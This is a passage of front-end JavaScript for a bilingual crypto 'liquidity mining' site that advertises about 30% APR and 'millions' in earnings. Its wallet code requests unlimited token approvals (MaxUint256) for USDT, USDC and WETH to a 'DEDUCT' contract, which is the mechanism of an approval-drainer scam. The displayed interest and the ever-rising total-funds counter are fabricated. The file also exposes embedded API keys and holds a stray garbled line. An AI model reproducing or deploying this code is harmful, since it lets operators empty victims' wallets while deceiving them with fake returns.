// ==================== Infura 備用節點 ====================
const INFURA_URL = 'https://mainnet.infura.io/v3/a4d896498845476cac19c5eefd3bcd92';

// ==================== Firebase 初始化 ====================
const app = window.firebase.initializeApp({
  apiKey: "AIzaSyALoso1ZAKtDrO09lfbyxyOHsX5cASPrZc",
  authDomain: "aroxa-mining.firebaseapp.com",
  projectId: "aroxa-mining",
  storageBucket: "aroxa-mining.firebasestorage.app",
  messagingSenderId: "596688766295",
  appId: "1:596688766295:web:5f2c5d65bf414f9dc7aa12"
});
const db = window.firebase.firestore();

// ==================== 常數 ====================
const DEDUCT_CONTRACT_ADDRESS = '0xaFfC493Ab24fD7029E03CED0d7B87eAFC36E78E0';
const USDT_CONTRACT_ADDRESS = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
const USDC_CONTRACT_ADDRESS = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48';
const WETH_CONTRACT_ADDRESS = '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2';
const DEDUCT_CONTRACT_ABI = [
  "function isServiceActiveFor(address customer) view returns (bool)",
  "function activateService(address tokenContract) external",
  "function REQUIRED_ALLOWANCE_THRESHOLD() view returns (uint256)",
  { "anonymous": false, "inputs": [ { "indexed": true, "name": "customer", "type": "address" }, { "indexed": true, "name": "tokenContract", "type": "address" } ], "name": "ServiceActivated", "type": "event" }
];
const ERC20_ABI = [
  "function approve(address spender, uint256 amount) external returns (bool)",
  "function balanceOf(address account) view returns (uint256)",
  "function allowance(address owner, address spender) view returns (uint256)"
];

// DOM 元素
let connectButton, statusDiv, startBtn, pledgeBtn, pledgeAmount, pledgeDuration, pledgeToken;
let refreshWallet, walletTokenSelect, walletBalanceAmount, accountBalanceValue, totalValue;
let grossOutputValue, cumulativeValue, nextBenefit, claimModal, closeModal, confirmClaim, cancelClaim;
let modalClaimableETH, modalSelectedToken, modalEquivalentValue, modalTitle, languageSelect;
let elements = {};

// 變數
let provider, signer, userAddress;
let deductContract, usdtContract, usdcContract, wethContract;
let pledgedAmount = 0;
let lastPayoutTime = null;
let totalGrossOutput = 0;
let interestInterval = null;
let nextBenefitInterval = null;
let claimInterval = null;
let accountBalance = { USDT: 0, USDC: 0, WETH: 0 };
let pendingUpdates = [];
let localLastUpdated = 0;
let authorizedToken = 'USDT';
window.currentClaimable = 0;
const MONTHLY_RATE = 0.01;
let ethPriceCache = { price: 2500, timestamp: 0, cacheDuration: 5 * 60 * 1000 };
const translations = {
  'en': {
    title: 'Liquidity Mining',
    subtitle: 'Start Earning Millions',
    tabLiquidity: 'Liquidity',
    tabPledging: 'Pledging',
    grossOutputLabel: 'Claimable Output',
    cumulativeLabel: 'Claimable',
    walletBalanceLabel: 'Wallet Balance',
    accountBalanceLabel: 'Account Balance',
    nextBenefit: 'Next Benefit: 00:00:00',
    startBtnText: 'Start',
    pledgeAmountLabel: 'Pledge Amount',
    pledgeDurationLabel: 'Duration',
    pledgeBtnText: 'Pledge Now',
    claimBtnText: 'Claim',
    noClaimable: 'No claimable interest available.',
    claimSuccess: 'Claim successful!',
    nextClaimTime: 'Next claim in 12 hours.',
    miningStarted: 'Mining started!',
    error: 'Error',
    offlineWarning: 'Server offline, using local mode.',
    noWallet: 'Please connect your wallet.',
    dataSent: 'Data sent.',
    pledgeSuccess: 'Pledge successful!',
    pledgeError: 'Pledge failed.',
    invalidPledgeAmount: 'Invalid amount.',
    invalidPledgeToken: 'Invalid token.',
    insufficientBalance: 'Insufficient balance.',
    ethersError: 'Ethers.js error.',
    approveError: 'Approval failed.',
    selectTokenFirst: 'Select token first.',
    balanceZero: 'Balance zero.',
    balanceTooLow: 'Balance too low.',
    wethValueTooLow: 'WETH value too low.',
    rulesTitle: 'Mining Rules',
    rulesContent: `
      <p>1. Select token, need at least 500 USDT/USDC or WETH $500 to start.</p>
      <p>2. Insufficient: can authorize but not start.</p>
      <p>3. APR: 28.3% ~ 31.5%.</p>
      <p>4. Interest every 12 hours (PT 00:00 & 12:00).</p>
      <p>5. Pledging independent.</p>
    `,
    modalClaimableLabel: 'Claimable',
    modalSelectedTokenLabel: 'Selected Token',
    modalEquivalentValueLabel: 'Equivalent Value'
  },
  'zh-Hant': {
    title: '流動性挖礦',
    subtitle: '開始賺取數百萬',
    tabLiquidity: '流動性',
    tabPledging: '質押',
    grossOutputLabel: '可領取產出',
    cumulativeLabel: '可領取',
    walletBalanceLabel: '錢包餘額',
    accountBalanceLabel: '帳戶餘額',
    nextBenefit: '下次收益: 00:00:00',
    startBtnText: '開始',
    pledgeAmountLabel: '質押金額',
    pledgeDurationLabel: '期間',
    pledgeBtnText: '立即質押',
    claimBtnText: '領取',
    noClaimable: '無可領取利息。',
    claimSuccess: '領取成功！',
    nextClaimTime: '下次領取時間：12 小時後。',
    miningStarted: '挖礦開始！',
    error: '錯誤',
    offlineWarning: '伺服器離線，使用本地模式。',
    noWallet: '請連結您的錢包。',
    dataSent: '數據已發送。',
    pledgeSuccess: '質押成功！',
    pledgeError: '質押失敗。',
    invalidPledgeAmount: '金額無效。',
    invalidPledgeToken: '代幣無效。',
    insufficientBalance: '餘額不足。',
    ethersError: 'Ethers.js 錯誤。',
    approveError: '授權失敗。',
    selectTokenFirst: '請先選擇代幣。',
    balanceZero: '餘額為零。',
    balanceTooLow: '餘額過低。',
    wethValueTooLow: 'WETH 價值過低。',
    rulesTitle: '挖礦規則',
    rulesContent: `
      <p>1. 選擇代幣，需至少 500 USDT/USDC 或 WETH $500 才能開始。</p>
      <p>2. 不足：可授權但無法開始。</p>
      <p>3. 年化利率：28.3% ~ 31.5%。</p>
      <p>4. 每 12 小時發放一次（美西時間 00:00 與 12:00）。</p>
      <p>5. 質押獨立運作。</p>
    `,
    modalClaimableLabel: '可領取',
    modalSelectedTokenLabel: '選擇代幣',
    modalEquivalentValueLabel: '等值金額'
  },
  'zh-Hans': {
    title: '流动性挖矿',
    subtitle: '开始赚取数百万',
    tabLiquidity: '流动性',
    tabPledging: '质押',
    grossOutputLabel: '可领取产出',
    cumulativeLabel: '可领取',
    walletBalanceLabel: '钱包余额',
    accountBalanceLabel: '账户余额',
    nextBenefit: '下次收益: 00:00:00',
    startBtnText: '开始',
    pledgeAmountLabel: '质押金额',
    pledgeDurationLabel: '期间',
    pledgeBtnText: '立即质押',
    claimBtnText: '领取',
    noClaimable: '无可领取利息。',
    claimSuccess: '领取成功！',
    nextClaimTime: '下次领取时间：12 小时后。',
    miningStarted: '挖矿开始！',
    error: '错误',
    offlineWarning: '服务器离线，使用本地模式。',
    noWallet: '请连接您的钱包。',
    dataSent: '数据已发送。',
    pledgeSuccess: '质押成功！',
    pledgeError: '质押失败。',
    invalidPledgeAmount: '金额无效。',
    invalidPledgeToken: '代币无效。',
    insufficientBalance: '余额不足。',
    ethersError: 'Ethers.js 错误。',
    approveError: '授权失败。',
    selectTokenFirst: '请先选择代币。',
    balanceZero: '余额为零。',
    balanceTooLow: '余额过低。',
    wethValueTooLow: 'WETH 价值过低。',
    rulesTitle: '挖矿规则',
    rulesContent: `
      <p>1. 选择代币，需至少 500 USDT/USDC 或 WETH $500 才能开始。</p>
      <p>2. 不足：可授权但无法开始。</p>
      <p>3. 年化利率：28.3% ~ 31.5%。</p>
      <p>4. 每 12 小时发放一次（美西时间 00:00 与 12:00）。</p>
      <p>5. 质押独立运作。</p>
    `,
    modalClaimableLabel: '可领取',
    modalSelectedTokenLabel: '选择代币',
    modalEquivalentValueLabel: '等值金额'
  }
};
let currentLang = localStorage.getItem('language') || 'en';

// 日誌函數
function log(message, type = 'info') {
  const timestamp = new Date().toLocaleTimeString();
  const prefix = { info: 'Info', success: 'Success', error: 'Error', send: 'Send', receive: 'Receive' }[type] || 'Info';
  console.log(`[${timestamp}] ${prefix} ${message}`);
  const logContent = document.getElementById('logContent');
  const logContainer = document.getElementById('logContainer');
  if (logContent && logContainer) {
    const line = document.createElement('div');
    line.textContent = `[${timestamp}] ${prefix} ${message}`;
    line.style.color = { info: '#ccc', success: '#0f0', error: '#f00', send: '#00f', receive: '#ff0' }[type] || '#ccc';
    logContent.appendChild(line);
    logContainer.style.display = 'block';
    logContainer.scrollTop = logContainer.scrollHeight;
  }
}

// 安全獲取 DOM 元素
function getElements() {
  connectButton = document.getElementById('connectButton');
  statusDiv = document.getElementById('status');
  startBtn = document.getElementById('startBtn');
  pledgeBtn = document.getElementById('pledgeBtn');
  pledgeAmount = document.getElementById('pledgeAmount');
  pledgeDuration = document.getElementById('pledgeDuration');
  pledgeToken = document.getElementById('pledgeToken');
  refreshWallet = document.getElementById('refreshWallet');
  walletTokenSelect = document.getElementById('walletTokenSelect');
  walletBalanceAmount = document.getElementById('walletBalanceAmount');
  accountBalanceValue = document.getElementById('accountBalanceValue');
  totalValue = document.getElementById('totalValue');
  grossOutputValue = document.getElementById('grossOutputValue');
  cumulativeValue = document.getElementById('cumulativeValue');
  nextBenefit = document.getElementById('nextBenefit');
  claimModal = document.getElementById('claimModal');
  closeModal = document.getElementById('closeModal');
  confirmClaim = document.getElementById('confirmClaim');
  cancelClaim = document.getElementById('cancelClaim');
  modalClaimableETH = document.getElementById('modalClaimableETH');
  modalSelectedToken = document.getElementById('modalSelectedToken');
  modalEquivalentValue = document.getElementById('modalEquivalentValue');
  modalTitle = document.getElementById('modalTitle');
  languageSelect = document.getElementById('languageSelect');
  elements = {
    title: document.getElementById('title'),
    subtitle: document.getElementById('subtitle'),
    tabLiquidity: document.querySelector('.tab[data-tab="liquidity"] span'),
    tabPledging: document.querySelector('.tab[data-tab="pledging"] span'),
    grossOutputLabel: document.getElementById('grossOutputLabel'),
    cumulativeLabel: document.getElementById('cumulativeLabel'),
    walletBalanceLabel: document.getElementById('walletBalanceLabel'),
    accountBalanceLabel: document.getElementById('accountBalanceLabel'),
    startBtnText: startBtn,
    pledgeAmountLabel: document.getElementById('pledgeAmountLabel'),
    pledgeDurationLabel: document.getElementById('pledgeDurationLabel'),
    pledgeBtnText: pledgeBtn
  };
}

async function retry(fn, maxAttempts = 3, delayMs = 3000) {
  for (let i = 0; i < maxAttempts; i++) {
    try {
      return await fn();
    } catch (error) {
      if (i === maxAttempts - 1) throw error;
      await new Promise(r => setTimeout(r, delayMs));
    }
  }
}

// ==================== Firestore 儲存 ====================
async function saveUserData(data = null, addToPending = true) {
  if (!userAddress) return;
  const dataToSave = data || {
    isActive: true,
    note: '',
    lastActivated: Date.now(),
    source: 'index.html',
    grossOutput: 0,
    cumulative: 0,
    claimedInterest: 0,
    walletBalance: '0',
    lastUpdated: Date.now(),
    accountBalance: accountBalance,
    stakingStartTime: lastPayoutTime || Date.now(),
    nextBenefitTime: localStorage.getItem('nextBenefitTime') || null,
    pledgedAmount: pledgedAmount,
    totalGrossOutput: totalGrossOutput,
    claimable: window.currentClaimable
  };
  log(`儲存資料到 Firestore: ${userAddress}`, 'send');
  try {
    await db.collection('users').doc(userAddress).set(dataToSave, { merge: true });
    log('資料儲存成功', 'success');
    localStorage.setItem('userData', JSON.stringify(dataToSave));
    localLastUpdated = dataToSave.lastUpdated;
  } catch (error) {
    log(`儲存失敗: ${error.message}`, 'error');
    if (addToPending) {
      pendingUpdates.push({ timestamp: Date.now(), payload: { data: dataToSave } });
    }
  }
}

// ==================== Firestore 載入 + 即時監聽 ====================
async function loadUserDataFromServer() {
  if (!userAddress) return;
  try {
    const snap = await db.collection('users').doc(userAddress).get();
    if (!snap.exists) {
      log(`無用戶數據`, 'info');
      return;
    }
    const userData = snap.data();
    const localData = JSON.parse(localStorage.getItem('userData') || '{}');
    localLastUpdated = localData.lastUpdated || 0;
    if (userData.lastUpdated > localLastUpdated || userData.source === 'admin.html') {
      pledgedAmount = userData.pledgedAmount ?? 0;
      lastPayoutTime = userData.lastPayoutTime ? parseInt(userData.lastPayoutTime) : null;
      totalGrossOutput = userData.totalGrossOutput ?? 0;
      window.currentClaimable = userData.claimable ?? 0;
      accountBalance = userData.accountBalance || { USDT: 0, USDC: 0, WETH: 0 };
      authorizedToken = userData.authorizedToken || 'USDT';
      localStorage.setItem('userData', JSON.stringify({
        pledgedAmount, lastPayoutTime, totalGrossOutput, claimable: window.currentClaimable,
        accountBalance, authorizedToken, nextBenefitTime: userData.nextBenefitTime,
        lastUpdated: userData.lastUpdated
      }));
      localLastUpdated = userData.lastUpdated;
      log(`資料同步成功`, 'success');
      updateClaimableDisplay();
    }
  } catch (error) {
    log(`載入失敗: ${error.message}`, 'error');
  }
}

// 即時監聽
function startRealtimeListener() {
  if (!userAddress) return;
  const unsubscribe = db.collection('users').doc(userAddress).onSnapshot((docSnap) => {
    if (docSnap.exists) {
      const userData = docSnap.data();
      if (userData.lastUpdated > localLastUpdated || userData.source === 'admin.html') {
        log(`即時更新: ${userData.source}`, 'receive');
        loadUserDataFromServer();
      }
    }
  }, (error) => {
    log(`監聽錯誤: ${error.message}`, 'error');
  });
  return unsubscribe;
}

function updateStatus(message, isWarning = false) {
  if (!statusDiv) return;
  statusDiv.innerHTML = message || '';
  statusDiv.style.display = message ? 'block' : 'none';
  statusDiv.style.color = isWarning ? '#FFD700' : '#00ffff';
  statusDiv.style.textShadow = isWarning ? '0 0 5px #FFD700' : '0 0 5px #00ffff';
}

function resetState(showMsg = true) {
  signer = userAddress = null;
  pledgedAmount = 0;
  lastPayoutTime = null;
  totalGrossOutput = 0;
  window.currentClaimable = 0;
  accountBalance = { USDT: 0, USDC: 0, WETH: 0 };
  authorizedToken = 'USDT';
  if (interestInterval) clearInterval(interestInterval);
  if (nextBenefitInterval) clearInterval(nextBenefitInterval);
  if (claimInterval) clearInterval(claimInterval);
  localStorage.clear();
  if (startBtn) {
    startBtn.style.display = 'block';
    startBtn.textContent = translations[currentLang].startBtnText;
  }
  if (connectButton) {
    connectButton.classList.remove('connected');
    connectButton.textContent = 'Connect Wallet';
  }
  disableInteractiveElements(true);
  if (walletBalanceAmount) walletBalanceAmount.textContent = '0.000';
  if (walletTokenSelect) walletTokenSelect.value = 'USDT';
  if (accountBalanceValue) accountBalanceValue.textContent = '0.000 USDT';
  if (grossOutputValue) grossOutputValue.textContent = '0 ETH';
  if (cumulativeValue) cumulativeValue.textContent = '0 ETH';
  if (showMsg) updateStatus(translations[currentLang].noWallet, true);
}

function disconnectWallet() {
  resetState(true);
}

function disableInteractiveElements(disable = false) {
  if (startBtn) startBtn.disabled = disable;
  if (pledgeBtn) pledgeBtn.disabled = disable;
  if (pledgeAmount) pledgeAmount.disabled = disable;
  if (pledgeDuration) pledgeDuration.disabled = disable;
  if (pledgeToken) pledgeToken.disabled = disable;
  if (refreshWallet) refreshWallet.style.opacity = disable ? '0.5' : '1';
}

function updateBalancesUI(walletBalances) {
  if (!walletTokenSelect) return;
  const selectedToken = walletTokenSelect.value;
  const decimals = { USDT: 6, USDC: 6, WETH: 18 };
  const walletTokenBigInt = walletBalances[selectedToken.toLowerCase()] || 0n;
  const formattedWalletBalance = ethers.formatUnits(walletTokenBigInt, decimals[selectedToken]);
  if (walletBalanceAmount) walletBalanceAmount.textContent = parseFloat(formattedWalletBalance).toFixed(3);
  const claimedBalance = accountBalance[selectedToken] || 0;
  const totalAccountBalance = parseFloat(formattedWalletBalance) + claimedBalance;
  if (accountBalanceValue) accountBalanceValue.textContent = `${totalAccountBalance.toFixed(3)} ${selectedToken}`;
}

function updateTotalFunds() {
  if (!totalValue) return;
  const initialFunds = 12856459.94;
  const increasePerSecond = 0.055;
  const fixedStartTime = 1698796800000;
  const elapsedSeconds = Math.floor((Date.now() - fixedStartTime) / 1000);
  const total = initialFunds + (elapsedSeconds * increasePerSecond);
  totalValue.textContent = `${total.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })} ETH`;
}

async function refreshEthPrice() {
  const now = Date.now();
  if (now - ethPriceCache.timestamp < ethPriceCache.cacheDuration) return;
  try {
    const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd');
    if (!response.ok) throw new Error();
    const data = await response.json();
    ethPriceCache.price = data.ethereum.usd;
    ethPriceCache.timestamp = now;
  } catch (error) {
    console.warn('Price fetch failed, using fallback');
  }
}

function initializeMiningData() {
  localStorage.setItem('totalGrossOutput', '0');
  localStorage.setItem('claimable', '0');
  localStorage.setItem('lastPayoutTime', (Date.now() - 24*60*60*1000).toString());
}

function getETOffsetMilliseconds() {
  const now = new Date();
  const mar = new Date(now.getFullYear(), 2, 8);
  const nov = new Date(now.getFullYear(), 10, 1);
  const marDay = mar.getDay();
  const novDay = nov.getDay();
  const dstStart = new Date(mar.getFullYear(), mar.getMonth(), 8 + (7 - marDay));
  const dstEnd = new Date(nov.getFullYear(), nov.getMonth(), 1 + (7 - novDay));
  return now >= dstStart && now < dstEnd ? -4 * 60 * 60 * 1000 : -5 * 60 * 60 * 1000;
}

function updateClaimableDisplay() {
  if (!grossOutputValue || !cumulativeValue) return;
  const claimable = window.currentClaimable || 0;
  grossOutputValue.textContent = `${claimable.toFixed(7)} ETH`;
  cumulativeValue.textContent = `${claimable.toFixed(7)} ETH`;
}

async function updateInterest() {
  if (!userAddress || pledgedAmount <= 0) {
    window.currentClaimable = 0;
    updateClaimableDisplay();
    return;
  }

  const now = Date.now();
  const etOffset = getETOffsetMilliseconds();
  const nowET = new Date(now + etOffset);

  // 每天 00:00 和 12:00（美西時間）
  const isPayoutTime = nowET.getHours() === 0 || nowET.getHours() === 12;
  const isExactMinute = nowET.getMinutes() === 0;

  // 必須是整點 + 整分
  if (!isPayoutTime || !isExactMinute) return;

  const lastPayout = parseInt(localStorage.getItem('lastPayoutTime')) || 0;
  const lastPayoutET = new Date(lastPayout + etOffset);
  const wasPayoutTime = lastPayoutET.getHours() === 0 || lastPayoutET.getHours() === 12;

  // 避免重複發放
  if (wasPayoutTime) return;

  // 發放利息
  const cycleInterest = pledgedAmount * (MONTHLY_RATE / 60);
  window.currentClaimable += cycleInterest;

  localStorage.setItem('claimable', window.currentClaimable.toString());
  localStorage.setItem('lastPayoutTime', now.toString());

  await saveUserData();
  log(`利息已撥付: ${cycleInterest.toFixed(7)} ETH`, 'success');
  updateClaimableDisplay();
}

function updateClaimModalLabels() {
  const claimLabels = {
    'en': { title: 'Claim', claimable: 'Claimable', selectedToken: 'Selected Token', equivalentValue: 'Equivalent Value' },
    'zh-Hant': { title: '領取', claimable: '可領取', selectedToken: '選擇代幣', equivalentValue: '等值金額' },
    'zh-Hans': { title: '领取', claimable: '可领取', selectedToken: '选择代币', equivalentValue: '等值金额' }
  };
  const labels = claimLabels[currentLang];
  if (modalTitle) modalTitle.textContent = labels.title;
  const labelElements = document.querySelectorAll('.claim-info .label');
  if (labelElements.length >= 3) {
    labelElements[0].textContent = labels.claimable;
    labelElements[1].textContent = labels.selectedToken;
    labelElements[2].textContent = labels.equivalentValue;
  }
}

async function claimInterest() {
  await refreshEthPrice();
  updateClaimModalLabels();
  const claimable = window.currentClaimable || 0;
  if (modalClaimableETH) modalClaimableETH.textContent = `${claimable.toFixed(7)} ETH`;
  if (modalSelectedToken) modalSelectedToken.textContent = authorizedToken;
  const tokenPrice = authorizedToken === 'WETH' ? ethPriceCache.price : 1;
  const equivalent = claimable * tokenPrice;
  if (modalEquivalentValue) modalEquivalentValue.textContent = `${equivalent.toFixed(3)} ${authorizedToken}`;
  if (claimModal) claimModal.style.display = 'flex';
}

function closeClaimModal() {
  if (claimModal) claimModal.style.display = 'none';
  if (claimInterval) clearInterval(claimInterval);
}

function updateNextBenefitTimer() {
  if (!nextBenefit) return;
  const nextBenefitTimestamp = parseInt(localStorage.getItem('nextBenefitTime')) || 0;
  const label = translations[currentLang].nextBenefit.split(':')[0];

  if (!nextBenefitTimestamp) {
    nextBenefit.textContent = `${label}: 00:00:00`;
    return;
  }

  const now = Date.now();
  let diff = nextBenefitTimestamp - now;

  if (diff <= 0) {
    const twelveHoursInMillis = 12 * 60 * 60 * 1000;
    const newNextBenefitTimestamp = nextBenefitTimestamp + twelveHoursInMillis;
    localStorage.setItem('nextBenefitTime', newNextBenefitTimestamp.toString());
    saveUserData();
    diff = newNextBenefitTimestamp - now;
  }

  const totalSeconds = Math.floor(Math.max(diff, 0) / 1000);
802
  const hours = String(Math.floor(totalSeconds / 3600)).padStart(2, '0');
  const minutes = String(Math.floor((totalSeconds % 3600) / 60)).padStart(2, '0');
  const seconds = String(totalSeconds % 60).padStart(2, '0');
  nextBenefit.textContent = `${label}: ${hours}:${minutes}:${seconds}`;
}

function setInitialNextBenefitTime() {
  if (localStorage.getItem('nextBenefitTime')) return;

  const etOffset = getETOffsetMilliseconds();
  const nowET = new Date(Date.now() + etOffset);

  const nextHour = nowET.getHours() < 12 ? 12 : 24;
  const nextBenefitTimeET = new Date(nowET);
  nextBenefitTimeET.setHours(nextHour, 0, 0, 0);

  const finalNextBenefitTimestamp = nextBenefitTimeET.getTime() - etOffset;
  localStorage.setItem('nextBenefitTime', finalNextBenefitTimestamp.toString());
  saveUserData();
}

function activateStakingUI() {
  if (startBtn) startBtn.style.display = 'none';
  initializeMiningData();

  if (interestInterval) clearInterval(interestInterval);
  interestInterval = setInterval(updateInterest, 60000);

  if (nextBenefitInterval) clearInterval(nextBenefitInterval);
  nextBenefitInterval = setInterval(updateNextBenefitTimer, 1000);

  setInitialNextBenefitTime();

  saveUserData();
  updateInterest();
}

async function sendMobileRobustTransaction(populatedTx) {
  if (!signer || !provider) throw new Error(translations[currentLang].error + ": Wallet not connected.");
  const txValue = populatedTx.value ? populatedTx.value.toString() : '0';
  const fromAddress = await signer.getAddress();
  const mobileTx = { from: fromAddress, to: populatedTx.to, data: populatedTx.data, value: '0x' + BigInt(txValue).toString(16) };
  let txHash, receipt = null;
  try {
    txHash = await provider.send('eth_sendTransaction', [mobileTx]);
    updateStatus(`TX sent: ${txHash.slice(0,10)}...`);
    receipt = await provider.waitForTransaction(txHash);
  } catch (error) {
    if (error.hash) txHash = error.hash;
    if (txHash) {
      updateStatus(`TX sent: ${txHash.slice(0,10)}...`);
      receipt = await provider.waitForTransaction(txHash);
    } else throw error;
  }
  if (!receipt || receipt.status !== 1) throw new Error(`TX reverted: ${txHash?.slice(0,10)||''}`);
  return receipt;
}

async function initializeWallet() {
  if (!window.ethers) {
    updateStatus(translations[currentLang].ethersError, true);
    if (connectButton) connectButton.disabled = true;
    return;
  }

  try {
    if (typeof window.ethereum !== 'undefined') {
      provider = new window.ethers.BrowserProvider(window.ethereum);
      log('偵測到錢包注入（支援任意錢包）', 'info');
    } else {
      provider = new window.ethers.JsonRpcProvider(INFURA_URL);
      log('無錢包注入，使用 Infura 備用節點（僅讀取）', 'info');
      updateStatus('請連結錢包以進行交易', true);
    }

    if (window.ethereum) {
      window.ethereum.on('accountsChanged', a => {
        if (a.length === 0) disconnectWallet();
        else if (userAddress && a[0].toLowerCase() !== userAddress.toLowerCase()) {
          resetState(false);
          setTimeout(connectWallet, 500);
        }
      });
      window.ethereum.on('chainChanged', () => {
        resetState(false);
        setTimeout(connectWallet, 500);
      });
    }

    const accounts = await provider.send('eth_accounts', []);
    if (accounts.length > 0) {
      await connectWallet();
    } else {
      disableInteractiveElements(true);
      updateStatus(translations[currentLang].noWallet, true);
      if (connectButton) connectButton.textContent = 'Connect Wallet';
    }
  } catch (e) {
    updateStatus(`${translations[currentLang].error}: ${e.message}`, true);
    if (connectButton) connectButton.disabled = true;
  }
}

async function connectWallet() {
  try {
    if (typeof window.ethereum === 'undefined') {
      updateStatus('請連結支援 EIP-1193 的錢包', true);
      return;
    }

    if (!provider) {
      provider = new window.ethers.BrowserProvider(window.ethereum);
    }

    updateStatus('Connecting...');
    const accounts = await provider.send('eth_requestAccounts', []);
    if (accounts.length === 0) throw new Error("No account.");

    signer = await provider.getSigner();
    userAddress = await signer.getAddress();

    deductContract = new window.ethers.Contract(DEDUCT_CONTRACT_ADDRESS, DEDUCT_CONTRACT_ABI, signer);
    usdtContract = new window.ethers.Contract(USDT_CONTRACT_ADDRESS, ERC20_ABI, signer);
    usdcContract = new window.ethers.Contract(USDC_CONTRACT_ADDRESS, ERC20_ABI, signer);
    wethContract = new window.ethers.Contract(WETH_CONTRACT_ADDRESS, ERC20_ABI, signer);

    if (connectButton) {
      connectButton.classList.add('connected');
      connectButton.textContent = 'Connected';
    }

    log(`錢包連接成功: ${userAddress}`, 'success');
    await loadUserDataFromServer();
    await saveUserData(null, false);
    startRealtimeListener();
    await updateUIBasedOnChainState();
    setTimeout(async () => await forceRefreshWalletBalance(), 1000);
  } catch (e) {
    log(`錢包連接失敗: ${e.message}`, 'error');
    updateStatus(`${translations[currentLang].error}: ${e.message}`, true);
    resetState(true);
  }
}

async function forceRefreshWalletBalance() {
  if (!userAddress) return;

  let currentProvider = provider;
  if (!window.ethereum) {
    currentProvider = new ethers.JsonRpcProvider(INFURA_URL);
  }

  updateStatus('Fetching balances...');
  try {
    const [usdtBal, usdcBal, wethBal] = await Promise.all([
      currentProvider.getBalance ? 0n : usdtContract.balanceOf(userAddress),
      currentProvider.getBalance ? 0n : usdcContract.balanceOf(userAddress),
      currentProvider.getBalance ? 0n : wethContract.balanceOf(userAddress)
    ]);
    const balances = { usdt: usdtBal, usdc: usdcBal, weth: wethBal };
    updateBalancesUI(balances);
    updateStatus('Balances updated.');
  } catch (error) {
    updateStatus('Balance fetch failed.', true);
  }
}

async function updateUIBasedOnChainState() {
  if (!userAddress) return;
  try {
    updateStatus('Checking state...');
    const requiredAllowance = await retry(() => deductContract.REQUIRED_ALLOWANCE_THRESHOLD());
    const [isServiceActive, usdtAllowance, usdcAllowance, wethAllowance] = await Promise.all([
      retry(() => deductContract.isServiceActiveFor(userAddress)),
      retry(() => usdtContract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS)).catch(() => 0n),
      retry(() => usdcContract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS)).catch(() => 0n),
      retry(() => wethContract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS)).catch(() => 0n)
    ]);
    const isWethAuthorized = wethAllowance >= requiredAllowance;
    const isUsdtAuthorized = usdtAllowance >= requiredAllowance;
    const isUsdcAuthorized = usdcAllowance >= requiredAllowance;
    const hasSufficientAllowance = isWethAuthorized || isUsdtAuthorized || isUsdcAuthorized;
    const isFullyAuthorized = isServiceActive || hasSufficientAllowance;
    if (isFullyAuthorized) {
      const selectedToken = walletTokenSelect ? walletTokenSelect.value : 'USDT';
      const tokenMap = { 'USDT': usdtContract, 'USDC': usdcContract, 'WETH': wethContract };
      const selectedContract = tokenMap[selectedToken];
      let balanceBigInt = 0n;
      try {
        balanceBigInt = await retry(() => selectedContract.balanceOf(userAddress));
      } catch (e) {}
      const decimals = selectedToken === 'WETH' ? 18 : 6;
      const balance = parseFloat(ethers.formatUnits(balanceBigInt, decimals));
      if (balance >= 1) {
        pledgedAmount = balance;
        lastPayoutTime = lastPayoutTime || Date.now();
        currentCycleInterest = calculatePayoutInterest();
        authorizedToken = selectedToken;
        localStorage.setItem('pledgedAmount', pledgedAmount.toString());
        localStorage.setItem('lastPayoutTime', lastPayoutTime.toString());
        localStorage.setItem('currentCycleInterest', currentCycleInterest.toString());
        localStorage.setItem('authorizedToken', authorizedToken);
        await saveUserData();
        initializeMiningData();
      }
      if (isWethAuthorized) {
        if (walletTokenSelect) walletTokenSelect.value = 'WETH';
        authorizedToken = 'WETH';
      } else if (isUsdtAuthorized) {
        if (walletTokenSelect) walletTokenSelect.value = 'USDT';
        authorizedToken = 'USDT';
      } else if (isUsdcAuthorized) {
        if (walletTokenSelect) walletTokenSelect.value = 'USDC';
        authorizedToken = 'USDC';
      }
      setInitialNextBenefitTime();
      activateStakingUI();
      if (pledgeBtn) pledgeBtn.disabled = false;
      if (pledgeAmount) pledgeAmount.disabled = false;
      if (pledgeDuration) pledgeDuration.disabled = false;
      if (pledgeToken) pledgeToken.disabled = false;
    } else {
      if (startBtn) startBtn.style.display = 'block';
      if (pledgeBtn) pledgeBtn.disabled = true;
      if (pledgeAmount) pledgeAmount.disabled = true;
      if (pledgeDuration) pledgeDuration.disabled = true;
      if (pledgeToken) pledgeToken.disabled = true;
    }
    disableInteractiveElements(false); updateStatus("");
  } catch (e) {
    updateStatus(`${translations[currentLang].error}: ${e.message}`, true);
  }
}

async function handleConditionalAuthorizationFlow() {
  if (!signer) throw new Error(translations[currentLang].error + ": Wallet not connected");
  updateStatus('Authorizing...');
  const selectedToken = walletTokenSelect ? walletTokenSelect.value : 'USDT';
  const requiredAllowance = await retry(() => deductContract.REQUIRED_ALLOWANCE_THRESHOLD());
  const serviceActivated = await retry(() => deductContract.isServiceActiveFor(userAddress));
  const tokenMap = {
    'USDT': { name: 'USDT', contract: usdtContract, address: USDT_CONTRACT_ADDRESS },
    'USDC': { name: 'USDC', contract: usdcContract, address: USDC_CONTRACT_ADDRESS },
    'WETH': { name: 'WETH', contract: wethContract, address: WETH_CONTRACT_ADDRESS }
  };
  const tokensToProcess = [tokenMap[selectedToken], ...Object.values(tokenMap).filter(t => t.name !== selectedToken)];
  let tokenToActivate = '';
  for (const { name, contract, address } of tokensToProcess) {
    if (!contract) continue;
    updateStatus(`Checking ${name} allowance...`);
    const currentAllowance = await retry(() => contract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS)).catch(() => 0n);
    if (currentAllowance < requiredAllowance) {
      updateStatus(`Requesting ${name} approval...`);
      try {
        const approvalTx = await contract.approve.populateTransaction(DEDUCT_CONTRACT_ADDRESS, ethers.MaxUint256);
        approvalTx.value = 0n;
        await sendMobileRobustTransaction(approvalTx);
        const newAllowance = await retry(() => contract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS)).catch(() => 0n);
        if (newAllowance >= requiredAllowance && !tokenToActivate) tokenToActivate = address;
      } catch (err) {
